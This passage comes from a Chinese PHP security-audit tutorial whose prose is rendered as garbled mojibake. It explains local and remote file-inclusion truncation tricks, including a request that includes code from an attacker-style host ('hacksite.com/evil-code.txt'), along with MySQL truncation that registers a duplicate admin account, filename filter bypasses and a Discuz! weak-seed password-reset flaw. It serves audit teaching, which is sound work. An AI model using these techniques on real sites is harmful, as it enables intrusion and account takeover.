</span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>].<span class="string">".php"</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æäº¤â€œaction=/etc/passwd%00â€ä¸­çš„â€œ%00â€å°†æˆªæ–­åé¢çš„â€œ.phpâ€ï¼Œä½†æ˜¯é™¤äº†â€œ%00â€è¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„å­—ç¬¦å¯ä»¥å®ç°æˆªæ–­ä½¿ç”¨å‘¢ï¼Ÿè‚¯å®šæœ‰äººæƒ³åˆ°äº†è¿œç¨‹åŒ…å«çš„urlé‡Œé—®å·â€œ?â€çš„ä½œç”¨ï¼Œé€šè¿‡æäº¤â€œaction=<code>http://www.hacksite.com/evil-code.txt</code>?â€è¿™é‡Œâ€œ?â€å®ç°äº†â€œä¼ªæˆªæ–­â€ï¼šï¼‰ï¼Œå¥½è±¡è¿™ä¸ªçœ‹ä¸Šå»ä¸æ˜¯é‚£ä¹ˆèˆ’æœé‚£ä¹ˆæˆ‘ä»¬ç®€å•å†™ä¸ªä»£ç fuzzä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">////////////////////</span></span><br><span class="line"><span class="comment">////var5.phpä»£ç :</span></span><br><span class="line"><span class="comment">////include $_GET['action'].".php"; </span></span><br><span class="line"><span class="comment">////print strlen(realpath("./"))+strlen($_GET['action']);  </span></span><br><span class="line"><span class="comment">///////////////////</span></span><br><span class="line">ini_set(<span class="string">'max_execution_time'</span>, <span class="number">0</span>);</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">$str=$str.<span class="string">"/"</span>;</span><br><span class="line"></span><br><span class="line">$resp=file_get_contents(<span class="string">'http://127.0.0.1/var/var5.php?action=1.txt'</span>.$str);</span><br><span class="line"><span class="comment">//1.txté‡Œçš„ä»£ç ä¸ºprint 'hi';</span></span><br><span class="line"><span class="keyword">if</span> (strpos($resp, <span class="string">'hi'</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">print</span> $i;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•å­—ç¬¦â€œ.â€ã€â€œ /â€æˆ–è€…2ä¸ªå­—ç¬¦çš„ç»„åˆï¼Œåœ¨ä¸€å®šçš„é•¿åº¦æ—¶å°†è¢«æˆªæ–­ï¼Œwinç³»ç»Ÿå’Œ<code>*</code>nixçš„ç³»ç»Ÿé•¿åº¦ä¸ä¸€æ ·ï¼Œå½“winä¸‹strlen(realpath(â€œ./â€œ))+strlen($<code>_</code>GET<code>[&#39;action&#39;]</code>)çš„é•¿åº¦å¤§äº256æ—¶è¢«æˆªæ–­ï¼Œå¯¹äº<code>*</code>nixçš„é•¿åº¦æ˜¯4 <code>*</code> 1024 = 4096ã€‚å¯¹äºphp.inié‡Œè®¾ç½®è¿œç¨‹æ–‡ä»¶å…³é—­çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„æŠ€å·§åŒ…å«æœ¬åœ°æ–‡ä»¶äº†ã€‚ï¼ˆæ­¤æ¼æ´ç”±cloie#ph4nt0m.orgæœ€å…ˆå‘ç°]ï¼‰</p><h4 id="æ•°æ®æˆªæ–­"><a href="#æ•°æ®æˆªæ–­" class="headerlink" title="æ•°æ®æˆªæ–­"></a>æ•°æ®æˆªæ–­</h4><p>å¯¹äºå¾ˆå¤šwebåº”ç”¨æ–‡ä»¶åœ¨å¾ˆå¤šåŠŸèƒ½æ˜¯ä¸å®¹è®¸é‡å¤æ•°æ®çš„ï¼Œæ¯”å¦‚ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½ç­‰ã€‚ä¸€èˆ¬çš„åº”ç”¨ç¨‹åºå¯¹äºæäº¤æ³¨å†Œçš„usernameå’Œæ•°æ®åº“é‡Œå·²æœ‰çš„usernameå¯¹æ¯”æ˜¯ä¸æ˜¯å·²ç»æœ‰é‡å¤æ•°æ®ï¼Œç„¶è€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡â€œæ•°æ®æˆªæ–­â€ç­‰æ¥é¥¶è¿‡è¿™äº›åˆ¤æ–­ï¼Œæ•°æ®åº“åœ¨å¤„ç†æ—¶å€™äº§ç”Ÿæˆªæ–­å¯¼è‡´æ’å…¥é‡å¤æ•°æ®ã€‚</p><p><em>1) Mysql SQL Column Truncation Vulnerabilities</em></p><p>è¿™ä¸ªæ¼æ´åˆæ˜¯å¤§ç‰›Stefan Esserå‘ç°çš„ï¼ˆStefan Esseræ˜¯æˆ‘çš„å¶åƒ:)ï¼‰ï¼Œè¿™ä¸ªæ˜¯ç”±äºmysqlçš„sql_modeè®¾ç½®ä¸ºdefaultçš„æ—¶å€™ï¼Œå³æ²¡æœ‰å¼€å¯STRICT_ALL_TABLESé€‰é¡¹æ—¶ï¼ŒMySQLå¯¹äºæ’å…¥è¶…é•¿çš„å€¼åªä¼šæç¤ºwarningï¼Œè€Œä¸æ˜¯errorï¼ˆå¦‚æœæ˜¯errorå°±æ’å…¥ä¸æˆåŠŸï¼‰ï¼Œè¿™æ ·å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æˆªæ–­é—®é¢˜ã€‚æµ‹è¯•å¦‚ä¸‹ï¼š<br>â€‹    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from truncated_test;</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| id | username   | password |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| 1 | admin      | pass     |</span><br><span class="line">| 2 | admin      | new_pass |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><em>2) Mysql charset Truncation vulnerability</em></p><p>è¿™ä¸ªæ¼æ´æ˜¯80secå‘ç°çš„ï¼Œå½“mysqlè¿›è¡Œæ•°æ®å­˜å‚¨å¤„ç†utf8ç­‰æ•°æ®æ—¶å¯¹æŸäº›å­—ç¬¦å¯¼è‡´æ•°æ®æˆªæ–­ã€‚æµ‹è¯•å¦‚ä¸‹ï¼š<br>â€‹    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from truncated_test;</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| id | username   | password |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| 1 | admin      | pass      |</span><br><span class="line">| 2 | admin      | new_pass  |</span><br><span class="line">| 3 | admin      | new_pass2 |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å¾ˆå¤šçš„webåº”ç”¨ç¨‹åºæ²¡æœ‰è€ƒè™‘åˆ°è¿™äº›é—®é¢˜ï¼Œåªæ˜¯åœ¨æ•°æ®å­˜å‚¨å‰ç®€å•æŸ¥è¯¢æ•°æ®æ˜¯å¦åŒ…å«ç›¸åŒæ•°æ®ï¼Œå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query(<span class="string">"SELECT * from test_user where user='$user' "</span>);</span><br><span class="line">  ....</span><br><span class="line"><span class="keyword">if</span>(@mysql_fetch_array($result, MYSQL_NUM)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"already exist"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><h4 id="æ–‡ä»¶æ“ä½œé‡Œçš„ç‰¹æ®Šå­—ç¬¦"><a href="#æ–‡ä»¶æ“ä½œé‡Œçš„ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="æ–‡ä»¶æ“ä½œé‡Œçš„ç‰¹æ®Šå­—ç¬¦"></a>æ–‡ä»¶æ“ä½œé‡Œçš„ç‰¹æ®Šå­—ç¬¦</h4><p>æ–‡ä»¶æ“ä½œé‡Œæœ‰å¾ˆå¤šç‰¹æ®Šçš„å­—ç¬¦ï¼Œå‘æŒ¥ç‰¹åˆ«çš„ä½œç”¨ï¼Œå¾ˆå¤šwebåº”ç”¨ç¨‹åºæ²¡æœ‰æ³¨æ„å¤„ç†è¿™äº›å­—ç¬¦è€Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚æ¯”å¦‚å¾ˆå¤šäººéƒ½çŸ¥é“çš„windowsç³»ç»Ÿæ–‡ä»¶åå¯¹â€œç©ºæ ¼â€å’Œâ€œ.â€ç­‰çš„å¿½è§†ï¼Œè¿™ä¸ªä¸»è¦ä½“ç°åœ¨ä¸Šä¼ æ–‡ä»¶æˆ–è€…å†™æ–‡ä»¶ä¸Šï¼Œå¯¼è‡´ç›´æ¥å†™webshellã€‚å¦å¤–å¯¹äºwindowsç³»ç»Ÿå¯¹â€œ...\â€è¿›è¡Œç³»ç»Ÿè½¬è·³ç­‰ç­‰ã€‚<br>â€‹<br>ä¸‹é¢è¿˜ç»™å¤§å®¶ä»‹ç»ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„é—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Is this code vul?</span></span><br><span class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"ERR"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</span><br><span class="line">.....</span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</span><br></pre></td></tr></table></figure><p>å¾ˆå¤šäººçœ‹å‡ºæ¥äº†ä¸Šé¢çš„ä»£ç çš„é—®é¢˜ï¼Œç¨‹åºé¦–å…ˆç¦æ­¢ä½¿ç”¨â€œ.phpâ€åç¼€ã€‚ä½†æ˜¯ä¸‹é¢å±…ç„¶æ¥äº†ä¸ªstr_replaceæ›¿æ¢$webdb[www_url]ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬æäº¤â€œ.p$webdb[www_url]hpâ€å°±å¯ä»¥é¥¶è¿‡äº†ã€‚é‚£ä¹ˆä¸Šé¢çš„ä»£ç æ‚fixå‘¢ï¼Ÿæœ‰äººç»™å‡ºäº†å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</span><br><span class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"ERR"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>str_replaceæåˆ°å‰é¢äº†ï¼Œå¾ˆå®Œç¾çš„è§£å†³äº†str_replaceä»£ç çš„å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯é—®é¢˜ä¸æ˜¯é‚£ä¹ˆç®€å•ï¼Œä¸Šé¢çš„ä»£ç åœ¨æŸäº›ç³»ç»Ÿä¸Šä¸€æ ·å¯ä»¥çªç ´ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆçœ‹çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++) &#123;</span><br><span class="line">$url = <span class="string">'1.ph'</span>.chr($i);</span><br><span class="line">$tmp = @file_get_contents($url);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i).<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨windowsç³»ç»Ÿè¿è¡Œä¸Šé¢çš„ä»£ç å¾—åˆ°å¦‚ä¸‹å­—ç¬¦<code>*</code> &lt; &gt; ? P péƒ½å¯ä»¥æ‰“å¼€ç›®å½•ä¸‹çš„1.phpã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæ–‡è¯»å–ä»¶æ“ä½œå‡½æ•°</td></tr></tbody></table><h3 id="æ€ä¹ˆè¿›ä¸€æ­¥å¯»æ‰¾æ–°çš„å­—å…¸"><a href="#æ€ä¹ˆè¿›ä¸€æ­¥å¯»æ‰¾æ–°çš„å­—å…¸" class="headerlink" title="æ€ä¹ˆè¿›ä¸€æ­¥å¯»æ‰¾æ–°çš„å­—å…¸"></a>æ€ä¹ˆè¿›ä¸€æ­¥å¯»æ‰¾æ–°çš„å­—å…¸</h3><p>ä¸Šé¢æˆ‘ä»¬åˆ—ä¸¾å¾ˆå¤šçš„å­—å…¸ï¼Œä½†æ˜¯å¾ˆå¤šéƒ½æ˜¯å·²ç»å…¬å¼€è¿‡çš„æ¼æ´æˆ–è€…æ–¹å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆè¿›ä¸€æ­¥æ‰¾åˆ°æ–°çš„å­—å…¸æˆ–è€…åˆ©ç”¨æ–¹å¼å‘¢ï¼Ÿ</p><ul><li>åˆ†æå’Œå­¦ä¹ åˆ«äººå‘ç°çš„æ¼æ´æˆ–è€…expï¼Œæ€»ç»“å‡ºæ¼æ´ç±»å‹åŠå­—å…¸</li><li>é€šè¿‡å­¦ä¹ phpæ‰‹å†Œæˆ–è€…å®˜æ–¹æ–‡æ¡£,æŒ–æ˜å‡ºæ–°çš„æœ‰å±å®³çš„å‡½æ•°æˆ–è€…åˆ©ç”¨æ–¹å¼</li><li>fuzz phpçš„å‡½æ•°ï¼Œæ‰¾åˆ°æ–°çš„æœ‰é—®é¢˜çš„å‡½æ•°ï¼ˆä¸ä¸€å®šéè¦æº¢å‡ºçš„ï¼‰ï¼Œå¦‚ä¸Šä¸€ç« çš„4.6çš„éƒ¨åˆ†å¾ˆå¤šéƒ½å¯ä»¥ç®€å•çš„fuzzè„šæœ¬å¯ä»¥æµ‹è¯•å‡ºæ¥</li><li>åˆ†æphpæºä»£ç ï¼Œå‘ç°æ–°çš„æ¼æ´å‡½æ•°â€œç‰¹æ€§â€æˆ–è€…æ¼æ´ã€‚ï¼ˆåœ¨ä¸Šä¸€èŠ‚é‡Œä»‹ç»çš„é‚£äº›â€œæ¼æ´å®¡è®¡ç­–ç•¥â€é‡Œï¼Œéƒ½æ²¡æœ‰phpæºä»£ç çš„åˆ†æï¼Œå¦‚æœä½ è¦è¿›ä¸€æ­¥æ‰¾åˆ°æ–°çš„å­—å…¸ï¼Œå¯ä»¥åœ¨phpæºä»£ç çš„åŸºç¡€ä¸Šåˆ†æä¸‹æˆå› ï¼Œç„¶åæ ¹æ®è¿™ä¸ªæˆå› æ¥åˆ†æå¯»æ‰¾æ–°çš„æ¼æ´å‡½æ•°â€œç‰¹æ€§â€æˆ–è€…æ¼æ´ã€‚ï¼‰ï¼ˆæˆ‘ä»¬ä»¥åä¼šé™†ç»­å…¬å¸ƒä¸€äº›æˆ‘ä»¬å¯¹phpæºä»£ç çš„åˆ†æï¼‰</li><li>æœ‰æ¡ä»¶æˆ–è€…æœºä¼šå’Œå¼€å‘è€…å­¦ä¹ ï¼Œæ‰¾åˆ°ä»–ä»¬å®ç°æŸäº›å¸¸ç”¨åŠŸèƒ½çš„ä»£ç çš„ç¼ºé™·æˆ–è€…å®¹æ˜“å¿½è§†çš„é—®é¢˜</li><li>ä½ æœ‰ä»€ä¹ˆè¦è¡¥å……çš„å—ï¼Ÿ ï¼šï¼‰</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><table><thead><tr><th style="text-align:left"><em>DEMO</em></th></tr></thead><tbody><tr><td style="text-align:left">*DEMO â€“ Discuz! Reset User Password 0day Vulnerability åˆ†æ</td></tr><tr><td style="text-align:left">ï¼ˆExp:[<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]ï¼‰" target="_blank" rel="noopener">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]ï¼‰</a>*</td></tr><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚:php4 php5&lt;5.2.6</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚: æ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥:æŸ¥æ‰¾mt_srand/mt_rand</td></tr></tbody></table><p>ç¬¬ä¸€æ­¥ å®‰è£…Discuz! 6.1ååˆ©ç”¨grepæŸ¥æ‰¾mt_srandå¾—åˆ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5</span><br><span class="line">./include/global.func.php-694-  $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);</span><br><span class="line">./include/global.func.php-695-  return '&lt;a href="tag-'.$name.'.html"'.stripslashes($extra).'&gt;';</span><br><span class="line">./include/global.func.php-696-&#125;</span><br><span class="line">./include/global.func.php-697-</span><br><span class="line">./include/global.func.php-698-function random($length, $numeric = 0) &#123;</span><br><span class="line">./include/global.func.php:699:  PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);</span><br><span class="line">./include/global.func.php-700-  if($numeric) &#123;</span><br><span class="line">./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));</span><br><span class="line">./include/global.func.php-702-  &#125; else &#123;</span><br><span class="line">./include/global.func.php-703-          $hash = '';</span><br><span class="line">./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';</span><br><span class="line">--</span><br><span class="line">./include/discuzcode.func.php-30-</span><br><span class="line">./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) | !is_array($_DCACHE['bbcodes']) | !is_array($_DCACHE['smilies'])) &#123;</span><br><span class="line">./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';</span><br><span class="line">./include/discuzcode.func.php-33-&#125;</span><br><span class="line">./include/discuzcode.func.php-34-</span><br><span class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</span><br><span class="line">./include/discuzcode.func.php-36-</span><br><span class="line">./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;</span><br><span class="line">./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;</span><br><span class="line">./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];</span><br><span class="line">./include/discuzcode.func.php-40-       if($attach['attachimg']) &#123;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªæ–‡ä»¶ç”¨åˆ°äº†mt_srand()ï¼Œç¬¬1æ˜¯åœ¨./include/global.func.phpçš„éšæœºå‡½æ•°random()é‡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­äº†ç‰ˆæœ¬ï¼Œå¦‚æœæ˜¯PHP_VERSION &gt; â€˜4.2.0â€™ä½¿ç”¨phpæœ¬èº«é»˜è®¤çš„æ’­ç§ã€‚ä»ä¸Šä¸€ç« é‡Œçš„åˆ†ææˆ‘ä»¬å¯ä»¥çœ‹å¾—å‡ºæ¥ï¼Œä½¿ç”¨phpæœ¬èº«é»˜è®¤çš„æ’­ç§çš„åˆ†ç¨‹åºä¸¤ç§æƒ…å†µï¼š</p><p>1) â€˜Cross Application Attacksâ€™ è¿™ä¸ªæ€è·¯æ˜¯åªè¦ç›®æ ‡ä¸Šæœ‰ä½¿ç”¨ä½¿ç”¨çš„ç¨‹åºé‡Œå®šä¹‰äº†ç±»ä¼¼mt_srand((double)microtime() <code>*</code> 1000000)çš„æ’­ç§çš„è¯ï¼Œåˆå¾ˆæœ‰å¯èƒ½è¢«æš´åŠ›ã€‚åœ¨dzè¿™é‡Œä¸éœ€è¦Cross Applicationï¼Œå› ä¸ºä»–æœ¬èº«æœ‰æ–‡ä»¶å°±å®šä¹‰äº†ï¼Œå°±æ˜¯ä¸Šé¢çš„ç¬¬2ä¸ªæ–‡ä»¶ï¼š </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è‚¯å®šdzæ˜¯å­˜åœ¨è¿™ä¸ªæ¼æ´çš„ï¼Œæ–‡ç« ç»™å‡ºæ¥çš„expä¹Ÿå°±æ˜¯åŸºäºè¿™ä¸ªçš„ã€‚ï¼ˆå…·ä½“expåˆ©ç”¨çš„æµç¨‹æœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±åˆ†æä¸‹]ï¼‰</p><p>2) æœ‰çš„äººè®¤ä¸ºå¦‚æœæ²¡æœ‰mt_srand((double)microtime() <code>*</code> 1000000);è¿™é‡Œçš„å®šä¹‰ï¼Œé‚£ä¹ˆdzå°±ä¸å­˜åœ¨æ¼æ´ï¼Œè¿™ä¸ªæ˜¯ä¸æ­£ç¡®çš„ã€‚é¦–å…ˆä½ ä¸å¯ä»¥ä¿è¯åˆ«äººä½¿ç”¨çš„å…¶ä»–åº”ç”¨ç¨‹åºæ²¡æœ‰å®šä¹‰ï¼Œå†æ¬¡ä¸åˆ©ç”¨â€™Cross Application Attacksâ€™ï¼Œ5.2.6&gt;php&gt;4.2.0 phpæœ¬èº«é»˜è®¤æ’­ç§çš„ç®—æ³•ä¹Ÿä¸æ˜¯å¾ˆå¼ºæ‚ï¼ˆåˆ†æè¯¦è§ä¸Šï¼‰ï¼Œä¹Ÿæ˜¯æœ‰å¯ä»¥æš´åŠ›å‡ºæ¥ï¼Œåªæ˜¯é€Ÿåº¦è¦æ…¢ä¸€ç‚¹ã€‚</p><h3 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h3><p>æœ¬æ–‡æ˜¯80vulçš„ä¸‰å¤§é©¬ç”²ï¼š80vul-Aï¼Œ80vul-Bï¼Œ80vul-Cé›†ä½“æ™ºæ…§çš„ç»“æ™¶ï¼Œå°¤å…¶æ˜¯80vul-Bè´¡çŒ®äº†ä¸å°‘æ–°å‘ç°ã€‚</p><p>å¦å¤–éœ€è¦æ„Ÿè°¢çš„æ˜¯æ–‡ç« é‡Œæåˆ°çš„é‚£äº›æ¼æ´çš„å‘ç°è€…ï¼Œæ²¡æœ‰ä»–ä»¬çš„æˆæœä¹Ÿå°±æ²¡æœ‰æœ¬æ–‡ã€‚</p><p>æœ¬æ–‡æ²¡æœ‰å†™â€œå‚è€ƒâ€ï¼Œå› ä¸ºæœ¬æ–‡æ˜¯ä¸€ä¸ªæ€»ç»“æ€§çš„æ–‡æŒ¡ï¼Œæœ‰å¤ªå¤šçš„è¿æ¥éœ€è¦æä¾›é™äºç¯‡å¹…å°±æ²¡æœ‰ä¸€ä¸€åˆ—ä¸¾ï¼Œæœ‰å¿ƒçš„è¯»è€…å¯ä»¥è‡ªè¡Œgoogleã€‚å¦å¤–åŸæœ¬æ²¡æœ‰æ‰“ç®—å…¬å¸ƒæ­¤æ–‡ï¼Œå› ä¸ºé‡Œé¢åŒ…å«äº†å¤ªå¤šåº”ç”¨ç¨‹åºçš„0dayï¼Œè€Œä¸”æœ‰å¤ªå¤šçš„ä¸å°Šé‡åˆ«äººæˆæœçš„äººï¼Œè€æ˜¯åˆ©ç”¨ä»åˆ«äººé‚£å­¦åˆ°çš„æŠ€æœ¯æ¥ç‚«è€€ï¼Œç”šè‡³ç‰Ÿå–åˆ©ç›Šã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å¸Œæœ›ä½ å¯ä»¥åœ¨æœ¬æ–‡é‡Œå­¦åˆ°äº›ä¸œè¥¿ï¼Œæ›´åŠ å¸Œæœ›å¦‚æœé€šè¿‡æœ¬æ–‡ä½ æ‰¾åˆ°äº†æŸäº›åº”ç”¨ç¨‹åºçš„0dayï¼Œè¯·ä½è°ƒå¤„ç†ï¼Œæˆ–è€…ç›´æ¥æäº¤ç»™å®˜æ–¹ä¿®è¡¥ï¼Œè°¢è°¢å¤§å®¶ï¼ï¼</p><h3 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h3><p>[1] (<a href="http://bbs.phpchina.com/attachment.php?aid=22294" target="_blank" rel="noopener">http://bbs.phpchina.com/attachment.php?aid=22294</a>)<br>[2] ([<a href="http://www.php-security.org/" target="_blank" rel="noopener">http://www.php-security.org/</a>)<br>[3] (<a href="http://bugs.php.net/bug.php?id=40114" target="_blank" rel="noopener">http://bugs.php.net/bug.php?id=40114</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
